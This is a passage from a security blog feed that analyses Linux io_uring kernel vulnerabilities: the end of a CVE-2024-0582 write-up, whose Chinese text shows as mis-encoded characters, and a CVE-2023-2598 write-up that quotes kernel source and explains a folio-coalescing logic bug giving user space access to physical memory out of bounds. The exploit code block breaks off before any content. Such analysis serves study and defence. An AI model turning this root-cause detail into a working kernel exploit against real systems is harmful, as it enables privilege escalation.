io_pbuf_get_address(ctx, bgid);<br>mutex_unlock(&amp;ctx-&gt;uring_lock);<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br>&#125;<br><br>page = virt_to_head_page(ptr);<br><span class="hljs-keyword">if</span> (sz &gt; page_size(page))<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥ <code>case IORING_OFF_PBUF_RING</code>è¿™ä¸ªåˆ†æ”¯ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›äº†å¯¹åº”<code>bgid</code>çš„ç¼“å†²åŒºåœ°å€ã€‚ç„¶åè°ƒäº†<code>io_pbuf_get_address</code>è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">io_pbuf_get_address</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bgid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><span class="hljs-comment">// æ ¹æ®io_uringä¸Šä¸‹æ–‡å’Œbgidè¿”å›buf_ringçš„å†…æ ¸æŒ‡é’ˆ</span><br>bl = io_buffer_get_list(ctx, bgid);<br><span class="hljs-keyword">if</span> (!bl || !bl-&gt;is_mmap)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> bl-&gt;buf_ring;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è¿”å›äº†<code>buf_ring</code>å¯¹åº”çš„å†…æ ¸æŒ‡é’ˆï¼Œç„¶åå†è¿”å›çœ‹<code>io_uring_mmap</code>è¿™ä¸ªå‡½æ•°ï¼Œå–è¿™ä¸ªå†…æ ¸æŒ‡é’ˆå¯¹åº”çš„ç‰©ç†è¿ç»­é¡µé¢çš„é¡µå¤´ï¼Œç„¶åè°ƒç”¨<code>remap_pfn_range()</code>å‡½æ•°ï¼Œå°†è¿™æ®µçœŸå®ç‰©ç†å†…å­˜æ˜ å°„åˆ°ç”¨æˆ·çš„<code>vma</code>ä»¥ä¾›ç”¨æˆ·ä½¿ç”¨ã€‚</p><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>å› æ­¤æ•´ä¸ªè§¦å‘é€»è¾‘å¯ä»¥æ€»ç»“ä¸ºï¼š</p><p>å†…æ ¸å’Œç”¨æˆ·å…±äº«ä¸€å—<code>bl-&gt;buf_ring</code>å¯¹åº”çš„çœŸå®ç‰©ç†åœ°å€åï¼Œè¿™å—ç‰©ç†åœ°å€é€šè¿‡<code>io_uring_mmap</code>æ˜ å°„ç»™ç”¨æˆ·ï¼Œç„¶åé€šè¿‡<code>io_unregister_pbuf_ring</code>å°†è¿™å—åœ°å€é‡Šæ”¾åï¼Œç”¨æˆ·ä»ç„¶æ‹¥æœ‰å¯¹è¿™å—çœŸå®ç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œå³è¿˜èƒ½å¤Ÿè¿›è¡Œè¯»å’Œå†™ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://arttnba3.cn/2025/02/22/CVE-0X0C-CVE-2024-0582/">arttnba3â€™s blog</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>io_uring</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-2598</title>
    <link href="/2025/08/20/CVE-2023-2598/"/>
    <url>/2025/08/20/CVE-2023-2598/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-2598"><a href="#CVE-2023-2598" class="headerlink" title="CVE-2023-2598"></a>CVE-2023-2598</h1><h2 id="whatâ€™s-io-uring"><a href="#whatâ€™s-io-uring" class="headerlink" title="whatâ€™s io_uring?"></a>whatâ€™s io_uring?</h2><p>â€‹<code>io_uring</code> is a system call interface for Linux. It has supported almost all system call so far, not only <code>read()</code> and <code>write</code> initially. It enables an application to initiate system calls that can be performed asynchronously.</p><span id="more"></span><h2 id="Submission-and-Completion-Queues"><a href="#Submission-and-Completion-Queues" class="headerlink" title="Submission and Completion Queues"></a>Submission and Completion Queues</h2><p>At the core of every <code>io_uring</code> implementation sit two ring buffers - the submission queue(SQ) and the completion queue(CQ). Those ring buffers are shared between application and kernel.</p><p>We can get a submission queue entry(SQE) which describing a <code>syscall</code> you want to be performed by <code>io_uring_get_sqe</code> . The application then performs an <code>io_uring_enter</code> syscall to effectively tell the kernel that there is work waiting to be done in the submission queue.</p><p>After the kernel performs the operation it puts a <em>Completion Queue Entry (CQE)</em> into the completion queue ring buffer which can then be consumed by the application.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The function <code>io_sqe_buffer_register</code>  implements the mapping of virtual pages and physical addresses.</p><p>We should clarify some concepts first.</p><p>The application initiates a request for a buffer by <code>io_uring_register</code>. The call chain is as follows:</p><p><code>io_uring_register_buffers</code>-&gt;<code>io_uring_register</code>-&gt;<code>io_sqe_buffers_register</code></p><p>The source code of function <code>io_sqe_buffers_register</code> is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffers_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg,</span><br><span class="hljs-params">    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_args, u64 __user *tags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">last_hpage</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_rsrc_data</span> *<span class="hljs-title">data</span>;</span><br><span class="hljs-type">int</span> i, ret;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br><br>BUILD_BUG_ON(IORING_MAX_REG_BUFFERS &gt;= (<span class="hljs-number">1u</span> &lt;&lt; <span class="hljs-number">16</span>));<br><br><span class="hljs-keyword">if</span> (ctx-&gt;user_bufs)<br><span class="hljs-keyword">return</span> -EBUSY;<br><span class="hljs-keyword">if</span> (!nr_args || nr_args &gt; IORING_MAX_REG_BUFFERS)<br><span class="hljs-keyword">return</span> -EINVAL;<br>ret = io_rsrc_node_switch_start(ctx);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>ret = io_rsrc_data_alloc(ctx, io_rsrc_buf_put, tags, nr_args, &amp;data);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>ret = io_buffers_map_alloc(ctx, nr_args);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>io_rsrc_data_free(data);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_args; i++, ctx-&gt;nr_user_bufs++) &#123;<br><span class="hljs-keyword">if</span> (arg) &#123;<br>ret = io_copy_iov(ctx, &amp;iov, arg, i);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>ret = io_buffer_validate(&amp;iov);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">memset</span>(&amp;iov, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(iov));<br>&#125;<br><br><span class="hljs-keyword">if</span> (!iov.iov_base &amp;&amp; *io_get_tag_slot(data, i)) &#123;<br>ret = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = io_sqe_buffer_register(ctx, &amp;iov, &amp;ctx-&gt;user_bufs[i],<br>     &amp;last_hpage);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>WARN_ON_ONCE(ctx-&gt;buf_data);<br><br>ctx-&gt;buf_data = data;<br><span class="hljs-keyword">if</span> (ret)<br>__io_sqe_buffers_unregister(ctx);<br><span class="hljs-keyword">else</span><br>io_rsrc_node_switch(ctx, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>In this function, we will run into <code>io_sqe_buffer_register</code>. And we will find a logical bug. The source code of function <code>io_sqe_buffer_register</code> is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_sqe_buffer_register</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-keyword">struct</span> iovec *iov,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> io_mapped_ubuf **pimu,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> page **last_hpage)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> *<span class="hljs-title">imu</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> off;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">int</span> ret, nr_pages, i;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>*pimu = ctx-&gt;dummy_ubuf;<br><span class="hljs-keyword">if</span> (!iov-&gt;iov_base)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = -ENOMEM;<br>pages = io_pin_pages((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base, iov-&gt;iov_len,<br>&amp;nr_pages);<br><span class="hljs-keyword">if</span> (IS_ERR(pages)) &#123;<br>ret = PTR_ERR(pages);<br>pages = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br><span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry */</span><br><span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123;<br>folio = page_folio(pages[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123;<br>folio = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (folio) &#123;<br>folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>);<br>nr_pages = <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br>imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!imu)<br><span class="hljs-keyword">goto</span> done;<br><br>ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>unpin_user_pages(pages, nr_pages);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br>off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>size = iov-&gt;iov_len;<br><span class="hljs-comment">/* store original address for later verification */</span><br>imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base;<br>imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len;<br>imu-&gt;nr_bvecs = nr_pages;<br>*pimu = imu;<br>ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (folio) &#123;<br>bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-type">size_t</span> vec_len;<br><br>vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>off = <span class="hljs-number">0</span>;<br>size -= vec_len;<br>&#125;<br>done:<br><span class="hljs-keyword">if</span> (ret)<br>kvfree(imu);<br>kvfree(pages);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>Here I only mention a few important points.</p><ol><li><code>imu</code> means virtual address&#x2F;page.</li><li><code>page</code> means physical address&#x2F;page.</li><li><code>folio</code> means a lot of pages that are continues physically, preventing the situation that when a function is called and its parameter contains a page, but this page belongs to a continuous range of pages, but we are not sure whether to use the whole page or a single page.</li><li><code>struct iovec</code> -&gt;  just a structure that describes a buffer, with the start address of the buffer and its length. Nothing more.</li><li>An <code>io_mapped_ubuf</code> is a structure that holds the information about a buffer that has been registered to an <code>io_uring</code> instance.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_mapped_ubuf</span> &#123;</span><br>u64ubuf; <span class="hljs-comment">// the address at which the buffer starts</span><br>u64ubuf_end; <span class="hljs-comment">// the address at which it ends</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>nr_bvecs; <span class="hljs-comment">// how many bio_vec(s) are needed to address the buffer </span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>acct_pages;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span><span class="hljs-title">bvec</span>[];</span> <span class="hljs-comment">// array of bio_vec(s)</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>The member <code>bio_ver</code> is a <code>struct</code> like <code>iovec</code> but for physical memory.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br><span class="hljs-comment">/* If it&#x27;s a huge page, try to coalesce them into a single bvec entry */</span><br><span class="hljs-keyword">if</span> (nr_pages &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// if more than one page</span><br>folio = page_folio(pages[<span class="hljs-number">0</span>]); <span class="hljs-comment">// converts from page to folio</span><br><span class="hljs-comment">// returns the folio that contains this page</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; nr_pages; i++) &#123;<br><span class="hljs-keyword">if</span> (page_folio(pages[i]) != folio) &#123; <span class="hljs-comment">// different folios -&gt; not physically contiguous </span><br>folio = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// set folio to NULL as we cannot coalesce into a single entry</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// if all the pages are in the same folio</span><br>folio_put_refs(folio, nr_pages - <span class="hljs-number">1</span>); <br>nr_pages = <span class="hljs-number">1</span>; <span class="hljs-comment">// sets nr_pages to 1 as it can be represented as a single folio page</span><br>&#125;<br>&#125;<br>...<br></code></pre></td></tr></table></figure><p>The code that checks if the pages are from the same folio doesnâ€™t actually check if they are consecutive. It can be the same page mapped multiple times. During the iteration <code>page_folio(page)</code> would return the same folio again and again passing the checks. This is an obvious logic bug. Letâ€™s continue with <code>io_sqe_buffer_register</code> and see what the fallout is.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>imu = kvmalloc(struct_size(imu, bvec, nr_pages), GFP_KERNEL); <br><span class="hljs-comment">// allocates imu with an array for nr_pages bio_vec(s)</span><br><span class="hljs-comment">// bio_vec - a contiguous range of physical memory addresses</span><br><span class="hljs-comment">// we need a bio_vec for each (physical) page</span><br>    <span class="hljs-comment">// in the case of a folio - the array of bio_vec(s) will be of size 1</span><br><span class="hljs-keyword">if</span> (!imu)<br><span class="hljs-keyword">goto</span> done;<br><br>ret = io_buffer_account_pin(ctx, pages, nr_pages, imu, last_hpage);<br><span class="hljs-keyword">if</span> (ret) &#123;<br>unpin_user_pages(pages, nr_pages);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><br>off = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base &amp; ~PAGE_MASK;<br>size = iov-&gt;iov_len; <span class="hljs-comment">// sets the size to that passed by the user!</span><br><span class="hljs-comment">/* store original address for later verification */</span><br>imu-&gt;ubuf = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) iov-&gt;iov_base; <span class="hljs-comment">// user-controlled</span><br>imu-&gt;ubuf_end = imu-&gt;ubuf + iov-&gt;iov_len; <span class="hljs-comment">// calculates the end based on the length</span><br>imu-&gt;nr_bvecs = nr_pages; <span class="hljs-comment">// this would be 1 in the case of folio</span><br>*pimu = imu;<br>ret = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (folio) &#123; <span class="hljs-comment">// in case of folio - we need just a single bio_vec (efficiant!)</span><br>bvec_set_page(&amp;imu-&gt;bvec[<span class="hljs-number">0</span>], pages[<span class="hljs-number">0</span>], size, off);<br><span class="hljs-keyword">goto</span> done;<br>&#125;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++) &#123; <br><span class="hljs-type">size_t</span> vec_len;<br><br>vec_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, size, PAGE_SIZE - off);<br>bvec_set_page(&amp;imu-&gt;bvec[i], pages[i], vec_len, off);<br>off = <span class="hljs-number">0</span>;<br>size -= vec_len;<br>&#125;<br>done:<br><span class="hljs-keyword">if</span> (ret)<br>kvfree(imu);<br>kvfree(pages);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>A single <code>bio_vec</code> is allocated as <code>nr_pages = 1</code>. The size of the buffer that is written in <code>pimu-&gt;iov_len</code> and <code>pimu-&gt;bvec[0].bv_len</code> is the one passed by the user in <code>iov-&gt;iov_len</code>.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span 